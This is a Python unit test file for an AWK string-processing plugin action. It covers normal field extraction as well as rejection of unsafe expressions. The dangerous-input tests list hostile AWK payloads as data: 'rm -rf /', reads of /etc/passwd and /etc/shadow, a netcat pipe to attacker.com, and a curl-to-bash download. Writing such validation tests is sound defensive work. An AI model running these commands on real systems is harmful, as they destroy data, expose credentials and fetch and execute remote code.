import os
import sys

sys.path.append(os.path.abspath("../"))

from typing import List
from unittest import TestCase
from unittest.mock import Mock

from insightconnect_plugin_runtime.exceptions import PluginException
from komand_awk.actions.process_string import ProcessString
from komand_awk.actions.process_string.schema import Input, Output
from parameterized import parameterized


class TestProcessString(TestCase):
    def setUp(self) -> None:
        self.action = ProcessString()
        self.action.connection = Mock()
        self.action.logger = Mock()

    @parameterized.expand(
        [
            ("basic_field_extraction", "John Doe 30\nJane Smith 25", "{print $1}", ["John", "Jane"], []),
            ("multiple_fields", "apple 5 red\nbanana 3 yellow", "{print $1, $2}", ["apple 5", "banana 3"], []),
            (
                "pattern_matching",
                "error: connection failed\ninfo: process started\nerror: timeout",
                "/error/ {print}",
                ["connection failed", "timeout"],
                ["info"],
            ),
            ("single_line", "hello world test", "{print $2}", ["world"], []),
            (
                "special_characters",
                "test@example.com 100\nuser#123 200",
                "{print $1, $2}",
                ["test@example.com", "user#123"],
                [],
            ),
            ("conditional", "10\n25\n5\n30", "$1 > 20 {print $1}", ["25", "30"], []),
            ("nr_variable", "line1\nline2\nline3", "{print NR, $0}", ["1 line1", "2 line2", "3 line3"], []),
            ("begin_block", "data", 'BEGIN {print "Starting"} {print $0}', ["Starting", "data"], []),
            ("multiline_with_tabs", "col1\tcol2\tcol3\nval1\tval2\tval3", "{print $2}", ["col2", "val2"], []),
        ]
    )
    def test_process_string(
        self, name: str, data: str, expression: str, expected_in_output: List[str], expected_not_in_output: List[str]
    ) -> None:
        response = self.action.run({Input.TEXT: data, Input.EXPRESSION: expression})
        output = response.get(Output.OUT, "")

        for expected in expected_in_output:
            self.assertIn(expected, output, f"Expected '{expected}' in output for test '{name}'")

        for not_expected in expected_not_in_output:
            self.assertNotIn(not_expected, output, f"Expected '{not_expected}' NOT in output for test '{name}'")

    @parameterized.expand(
        [
            ("calculation_sum", "10\n20\n30", "{sum += $1} END {print sum}", "60"),
            ("empty_input", "", "{print $1}", ""),
            ("field_separator", "name:John,age:30\nname:Jane,age:25", 'BEGIN {FS=":"} {print $2}', "John"),
        ]
    )
    def test_process_string_exact_match(self, name: str, data: str, expression: str, expected_output: str) -> None:
        response = self.action.run({Input.TEXT: data, Input.EXPRESSION: expression})
        output = response.get(Output.OUT, "").strip()
        self.assertIn(expected_output, output)

    @parameterized.expand(
        [
            ("command_injection_system", "test data", '{system("rm -rf /")}'),
            ("command_injection_pipe", "test data", '{print $0 | "cat /etc/passwd"}'),
            ("file_read_attempt", "test data", '{getline < "/etc/shadow"}'),
            ("file_write_attempt", "test data", '{print $0 > "/tmp/malicious.txt"}'),
            ("network_access", "test data", '{print |& "nc attacker.com 1234"}'),
            (
                "script_execution",
                "test data",
                "BEGIN {system(\"/bin/bash -c 'curl http://example.com/script.sh | bash'\")}",
            ),
            ("environment_variable_access", "test data", '{print ENVIRON["PATH"]}'),
        ]
    )
    def test_process_string_dangerous_input(self, name: str, data: str, expression: str) -> None:
        with self.assertRaises(PluginException, msg=f"Expected PluginException for test '{name}'"):
            self.action.run({Input.TEXT: data, Input.EXPRESSION: expression})

    @parameterized.expand(
        [
            ("invalid_syntax", "test data", "{print $1"),
            ("unclosed_string", "test data", '{print "hello}'),
            ("invalid_regex", "test data", "/[invalid/"),
            ("undefined_function", "test data", "{nonexistent_function()}"),
            ("invalid_field_separator", "test data", "-F"),
        ]
    )
    def test_process_string_invalid_expressions(self, name: str, data: str, expression: str) -> None:
        """Test that invalid AWK expressions raise PluginException"""
        with self.assertRaises(PluginException, msg=f"Expected PluginException for test '{name}'"):
            self.action.run({Input.TEXT: data, Input.EXPRESSION: expression})

    @parameterized.expand(
        [
            ("null_bytes", "test\x00data", "{print $1}"),
            ("unicode_characters", "test 日本語 データ", "{print $2}"),
            ("control_characters", "test\r\ndata\x1b[31m", "{print $1}"),
            ("very_long_line", "a" * 100000, "{print length($0)}"),
        ]
    )
    def test_process_string_edge_cases(self, name: str, data: str, expression: str) -> None:
        # Should handle gracefully - either succeed or raise PluginException
        try:
            response = self.action.run({Input.TEXT: data, Input.EXPRESSION: expression})
            self.assertIsNotNone(response.get(Output.OUT))
        except PluginException:
            # Acceptable for some edge cases
            pass
